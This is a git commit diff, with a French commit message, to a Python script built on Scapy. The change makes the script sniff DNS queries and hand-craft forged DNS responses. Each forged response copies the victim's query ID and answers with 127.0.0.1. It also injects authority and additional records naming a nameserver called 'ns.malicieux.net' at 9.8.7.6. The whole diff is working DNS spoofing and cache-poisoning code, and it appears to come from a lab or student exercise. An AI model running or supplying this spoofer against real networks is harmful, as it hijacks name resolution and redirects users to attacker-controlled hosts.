32b9d1bcf73951c4800683c59ebdf060f87839f0
wilhelmbh <wilhelmhb@live.fr>
2015-11-16 17:03:25 +0100

    création à la main des paquets DNS, avec les info nécessaires=>valeurs à vérifier

--- action.py
+++ action.py
@@ -20,12 +20,30 @@ def maFonction(a):
     if (a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a'):
         msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
-        paquet[IP].src = a[IP].dst
-        paquet[IP].dst = a[IP].src
-        paquet[DNS].an[0].rrname=a[DNS].qd[0].qname
-        paquet[DNS].id=a[DNS].id
-        tosend=Ether()/paquet
-        sendp(tosend)
+        src = a[IP].dst
+        dst = a[IP].src
+        rrname=a[DNS].qd[0].qname
+        id=a[DNS].id
+        d = DNS()
+        d.qr = 1      #1 for Response
+        d.opcode = 16
+        d.aa = 0
+        d.tc = 0
+        d.rd = 0
+        d.ra = 1
+        d.z = 8
+        d.rcode = 0
+        d.qdcount = 1      #Question Count
+        d.ancount = 1      #Answer Count
+        d.nscount = 0      #No Name server info
+        d.arcount = 0      #No additional records
+        d.qd = str(a[DNS].qd)
+        d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
+        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "ns.malicieux.net")
+        d.ar = DNSRR(rrname = "ns.malicieux.net", type = "A", ttl = 86400, rdata = "9.8.7.6")
+        spoofed = IP(src=src, dst=dst)/UDP()/d
+        sendp(spoofed, iface_hint=src)
+
         
 def monFiltre(x):
     return (x.haslayer(DNS)) and (x[DNS].qr==0L)
